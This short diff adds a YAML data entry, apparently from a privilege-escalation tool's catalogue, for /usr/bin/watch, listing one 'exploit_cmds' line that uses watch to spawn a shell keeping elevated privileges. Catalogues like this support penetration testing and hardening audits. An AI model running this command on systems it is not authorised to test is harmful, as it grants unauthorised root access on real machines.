@@ -1,0 +1,4 @@
+name: watch
+binary_path: /usr/bin/watch
+exploit_cmds:
+- /usr/bin/watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
